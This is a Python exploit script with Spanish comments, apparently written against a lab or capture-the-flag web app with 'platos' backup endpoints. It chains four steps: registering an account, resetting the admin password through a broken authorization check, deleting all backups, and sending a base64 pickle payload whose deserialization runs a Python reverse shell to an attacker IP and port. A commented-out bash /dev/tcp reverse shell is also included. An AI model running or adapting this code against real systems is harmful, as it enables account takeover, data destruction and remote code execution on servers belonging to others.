import requests
import json
import pickle
import os
import base64
import sys


if len(sys.argv) != 5:
    print("Ejecutalo asi: ")
    print("\tpython3 exploit.py <ip-attacker> <port-attacker> <ip-victim> <port-victim>")
    sys.exit(257)
ip_attacker = sys.argv[1]
port_attacker = sys.argv[2]
ip_victim = sys.argv[3]
port_victim = sys.argv[4]

class rce:
    def __reduce__(self):

        #cmd = ('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"')
        cmd = (f"""python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("{ip_attacker}",{port_attacker}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'""")
        return os.system, (cmd, )

def create_user(username, password, email):
    headers = {
        'Content-Type': 'application/json'
    }

    data = {
        "username": username,
        "password": password,
        "email": email
    }

    r = requests.post(f"http://{ip_victim}:{port_victim}/users/register", headers=headers, json=data)

    print(r.text)

def login(username, password):
    headers = {
        'Content-Type': 'application/json'
    }

    data = {
        "username": username,
        "password": password
    }

    r = requests.post(f"http://{ip_victim}:{port_victim}/users/login", headers=headers, json=data)

    output = json.loads(r.text)
    return output['auth_token']

def change_password(jwt_bearer, username, password):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + jwt_bearer
    }

    data = {
        "password": password
    }

    r = requests.put(f"http://{ip_victim}:{port_victim}/users/change_password/{username}",
                        headers=headers, json=data)

    #print(r.text)

def delete_backups(jwt_bearer):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + jwt_bearer
    }

    r = requests.get(f"http://{ip_victim}:{port_victim}/platos/backup/delete_all", headers=headers)

    #print(r.text)

def create_obj_exploit():
    return base64.urlsafe_b64encode(pickle.dumps(rce())).decode()

def send_exploit(jwt_bearer, payload):
    headers = {
        'Authorization': 'Bearer ' + jwt_bearer
    }

    r = requests.delete(f"http://{ip_victim}:{port_victim}/platos/create_backup/{payload}", headers=headers)
    #print(r.text)

def exploit():
    r = requests.get(f"http://{ip_victim}:{port_victim}/platos/backup")
    #print(r.text)

create_user("mago1", "password123", "mago1@test.com")
change_password(login("mago1", "password123"), "admin", "test123")
# 0. /platos/backup/delete_all borrar los backups
delete_backups(login("admin", "test123"))
# 1. Serializamos el objeto malicioso
payload = create_obj_exploit()
# 2. Es cargarlo /platos/create_backup/
send_exploit(login("admin", "test123"), payload)
# 3. entrar a:  /platos/backup para la deserializacion
exploit()
